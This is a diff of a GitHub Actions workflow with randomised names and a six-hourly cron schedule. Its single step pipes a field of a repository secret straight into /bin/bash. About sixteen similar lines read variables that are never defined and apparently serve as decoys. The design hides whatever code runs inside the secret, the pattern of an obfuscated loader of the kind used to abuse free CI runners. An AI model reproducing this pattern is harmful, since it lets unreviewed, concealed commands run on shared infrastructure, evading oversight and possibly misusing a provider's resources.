@@ -1,27 +1,34 @@
 name: linxuns
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 2/6 * * *'
-jobs:  # 22702
+    - cron: '19 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: linxuns
         env:
-          e2154: ${{ secrets.e2154 }}
+          mftc2: ${{ secrets.mftc2 }}
         run: |
-          echo $e2154 | jq -r .ti12307 | /bin/bash
-          echo $hhctg4 | jq -r .jbj512 | /bin/bash
-          echo $i1 | jq -r .tdqh5543 | /bin/bash
-          echo $adxv241 | jq -r .j8 | /bin/bash
-          echo $isgpv39806 | jq -r .mo57 | /bin/bash
-          echo $wmznm71513 | jq -r .u72541 | /bin/bash
-          echo $g4982 | jq -r .hjq1 | /bin/bash
-          echo $rhd14179 | jq -r .siace57158 | /bin/bash
-          echo $kyh1 | jq -r .p39 | /bin/bash
-          echo $jy03 | jq -r .abktu05950 | /bin/bash
-          echo $ejh8 | jq -r .qvedz5 | /bin/bash
-          echo $ut91616 | jq -r .cn22 | /bin/bash
+          echo $mftc2 | jq -r .gavq90 | /bin/bash
+          echo $e526 | jq -r .p65 | /bin/bash
+          echo $mzfj70 | jq -r .v22 | /bin/bash
+          echo $udwcu2168 | jq -r .qmnaz493 | /bin/bash
+          echo $bwpws5 | jq -r .hdkjw3 | /bin/bash
+          echo $wuj1 | jq -r .qnjh8 | /bin/bash
+          echo $qcs56800 | jq -r .xar70697 | /bin/bash
+          echo $fkae4 | jq -r .w3337 | /bin/bash
+          echo $g5 | jq -r .ujdd585 | /bin/bash
+          echo $hew632 | jq -r .xtcfh16 | /bin/bash
+          echo $u236 | jq -r .fou43 | /bin/bash
+          echo $taec0 | jq -r .rnykd00 | /bin/bash
+          echo $y9268 | jq -r .fiqrc12761 | /bin/bash
+          echo $gz6485 | jq -r .i6 | /bin/bash
+          echo $nga314 | jq -r .xjs2364 | /bin/bash
+          echo $d93605 | jq -r .iqczn2463 | /bin/bash
+          echo $qnjjm12585 | jq -r .ena68 | /bin/bash
 
